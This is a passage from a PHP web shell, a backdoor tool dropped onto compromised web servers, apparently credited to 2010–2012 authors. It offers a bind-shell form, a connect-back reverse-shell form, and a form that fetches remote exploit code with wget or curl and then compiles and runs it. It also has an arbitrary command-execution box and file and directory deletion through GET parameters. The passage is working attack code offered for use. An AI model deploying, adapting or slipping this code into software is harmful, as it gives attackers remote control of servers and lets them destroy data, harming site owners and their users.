		if(is_file($namafile)) { $msg = exe($wcmd); } else $msg = "error: file not found $namafile"; } 
	?> 
	<table class="tabnet"> 
		<tr>
			<th>Port Binding</th>
			<th>Connect Back</th>
			<th>Load and Exploit</th>
		</tr> 
		<tr> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>Port</td>
						<td>
						<input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>">
						</td>
					</tr> 
					<tr>
						<td>Password</td>
						<td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td>
					</tr> 
					<tr>
						<td>Use</td>
						<td style="text-align:justify">
							<p>
							<select class="inputz" size="1" name="use">
								<option value="Perl">Perl</option>
								<option value="C">C</option>
							</select> 
							<input class="inputzbut" type="submit" name="bind" value="Bind !" style="width:120px">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>IP</td>
						<td>
						<input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>">
						</td>
					</tr> 
					<tr>
						<td>Port</td>
						<td>
						<input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>">
						</td>
					</tr> 
					<tr>
						<td>Use</td>
						<td style="text-align:justify">
							<p>
							<select size="1" class="inputz" name="use">
								<option value="Perl">Perl</option>
								<option value="C">C</option>
							</select> 
							<input type="submit" name="backconn" value="Connect !" class="inputzbut" style="width:120px">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
			<td> 
				<form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> 
				<table> 
					<tr>
						<td>url</td>
						<td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td>
					</tr> 
					<tr>
						<td>cmd</td>
						<td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> 
					</tr> 
					<tr>
						<td>
						<select size="1" class="inputz" name="pilihan"> 
							<option value="wwget">wget</option> 
							<option value="wlynx">lynx</option> 
							<option value="wfread">fread</option> 
							<option value="wfetch">fetch</option> 
							<option value="wlinks">links</option> 
							<option value="wget">GET</option> 
							<option value="wcurl">curl</option>
						</select>
						</td>
						<td colspan="2">
							<input type="submit" name="expcompile" class="inputzbut" value="Go !" style="width:246px;">
						</td>
					</tr>
				</table> 
				</form> 
			</td> 
		</tr> 
	</table> 
	<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'shell'))
	{ 
	?> 
	<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"> 
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
				<textarea class="output" readonly> <?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea> 
				</td>
			</tr>
			<tr>
				<td colspan="2"><?php echo $prompt; ?>
				<input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" />
				<input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" />
				</td>
			</tr> 
		</table> 
	</form> <?php 
	} 
else 
	{ 
	if(isset($_GET['delete']) && ($_GET['delete'] != ""))
		{ 
		$file = $_GET['delete']; @unlink($file); 
		} 
	elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != ""))
		{ 
		@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR)); 
		} 
	elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != ""))
		{ 
		$path = $pwd.$_GET['mkdir']; @mkdir($path); 
		} 
	$buff = showdir($pwd,$prompt); 
	echo $buff; 
	} 
	?>
    <center><br><br><br><br>
    Coded by Joker & P.K Newbie3viLc063s 2010-2012</br>
    Mod by Altenator IWnet <img src='http://l.yimg.com/a/i/us/msg/emoticons/pirate_2.gif' /><br>
    </center>
    
		</div> 
	</body> 
</html>
